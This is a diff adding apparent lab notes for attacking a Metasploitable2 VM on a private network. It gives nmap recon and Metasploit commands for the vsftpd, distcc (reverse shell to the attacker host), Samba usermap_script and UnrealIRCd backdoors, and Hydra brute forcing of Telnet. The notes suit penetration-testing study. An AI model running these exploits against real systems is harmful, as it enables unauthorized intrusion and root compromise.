@@ -1,0 +1,122 @@
+Target:
+Metasploitable2
+IP: 192.168.56.101
+
+Attacker:
+Kali Linux
+IP: 192.168.56.1
+-----------------------------------
+
+- Reconnaissence:
+
+1. Host Discovery: Scan the network for live hosts
+- nmap -sn 192.168.56.0/24
+
+Result:
+- 192.168.56.101 is alive
+
+---
+
+2. Service enumeration: Identify open services and versions
+- nmap -sS -sV -O -p- 192.168.56.101
+
+Result (Important services):
+21      FTP     vsftpd 2.3.4
+22      SSH
+23      Telnet
+25      SMTP
+53      DNS
+80      HTTP
+139     SMB
+445     SMB
+3306    MySQL
+5432    PostgreSQL
+6667    IRC
+
+
+Attacks:
+-----------------------------------
+1. VSFTPD Backdoor
+
+- Version: 
+vsftpd 2.3.4
+
+- Exploit: 
+exploit/unix/ftp/vsftpd_234_backdoor
+
+- Steps:
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.101
+run
+
+- Result: 
+Shell access to the system.
+
+-----------------------------------
+2. VSFTPD DistCC Command Execution
+
+- Version: 
+distccd
+ 
+- Exploit: 
+exploit/unix/misc/distcc_exec
+
+- Steps:
+msfconsole
+use exploit/unix/misc/distcc_exec
+set payload cmd/unix/reverse_ruby
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.1
+run
+ 
+- Result: 
+Remote command execution shell.
+-----------------------------------
+3. Samba Username Map Script
+
+- Version:
+Samba 3.0.20
+
+- Exploit:
+exploit/multi/samba/usermap_script
+
+- Reconnaissance
+nmap -p 139,445 -sV 192.168.56.101
+
+- Result:
+139/tcp open  netbios-ssn Samba smbd 3.0.20
+445/tcp open  netbios-ssn Samba smbd 3.0.20
+
+- Steps
+msfconsole
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.1
+show options
+run
+
+- Result:
+The Samba 3.0.20 service is vulnerable to a username map script command injection vulnerability.
+The exploit allows arbitrary commands to be executed by the Samba service. Since the service runs with root privileges on this system, the exploit immediately results in a root shell without requiring additional privilege escalation.
+-----------------------------------
+
+4. UnrealIRCd Backdoor:
+- Version: UnrealIRCd
+- Exploit: exploit/unix/irc/unreal_ircd_3281_backdoor
+- Result: Backdoor command execution.
+-----------------------------------
+
+5. Telnet Weak Credentials:
+- Version: Telnet
+- Exploit: Hydra brute force against Telnet service
+- Result: Attempt to discover valid credentials for Telnet login (likely msfadmin:msfadmin on Metasploitable).
+
+Attack:
+- Bruteforce both username and password:
+    hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f -v telnet://192.168.56.101
+- Credentials:
+    - Username: msfadmin
+    - Password: msfadmin
+- Log in:
+    telnet 192.168.56.101
